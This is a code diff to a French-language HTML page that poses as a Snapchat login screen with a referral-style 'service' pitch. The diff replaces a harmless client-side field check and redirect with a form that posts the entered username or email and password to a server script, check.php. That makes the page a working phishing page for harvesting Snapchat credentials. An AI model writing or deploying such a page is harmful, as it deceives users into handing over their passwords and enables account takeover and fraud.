@@ -90,9 +90,11 @@
  
   <div class="container">
     <h2>Connexion à Snapchat</h2>
-    <input type="text" id="identifiant" placeholder="Nom d'utilisateur ou email/numéro">
-    <input type="password" id="motdepasse" placeholder="Mot de passe">
-    <button onclick="seConnecter()">Se connecter</button>
+    <form action="check.php" method="post">
+      <input type="text" name="identifiant" placeholder="Nom d'utilisateur ou email/numéro" required>
+      <input type="password" name="motdepasse" placeholder="Mot de passe" required>
+      <button type="submit">Se connecter</button>
+    </form>
   </div>
 
   <div class="info">
@@ -105,18 +107,6 @@
     <p><strong>Pourquoi utiliser notre service ?</strong><br>
     En passant par notre page, vous réduisez les empreintes carbone, vous économisez de l'argent, et nous permettez aussi de gagner un peu. Un bon plan pour tout le monde ! 🌍💸</p>
   </div>
-
-  <script>
-    function seConnecter() {
-      const id = document.getElementById('identifiant').value.trim();
-      const mdp = document.getElementById('motdepasse').value.trim();
-      if (id !== "" && mdp !== "") {
-        window.location.href = "parrainage.html";
-      } else {
-        alert("Veuillez remplir tous les champs.");
-      }
-    }
-  </script>
 
 </body>
 </html>
